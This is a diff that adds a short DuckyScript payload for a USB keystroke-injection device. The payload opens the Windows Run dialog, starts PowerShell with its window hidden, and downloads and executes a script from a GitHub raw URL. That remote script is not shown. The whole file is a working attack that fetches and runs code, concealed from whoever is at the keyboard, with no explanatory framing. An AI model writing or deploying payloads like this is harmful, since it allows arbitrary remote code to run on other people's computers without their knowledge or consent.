@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 150
+STRING powershell -windowstyle hidden iex (wget https://raw.githubusercontent.com/fireworm0/Rubber-Duck/master/wp.ps)
+ENTER
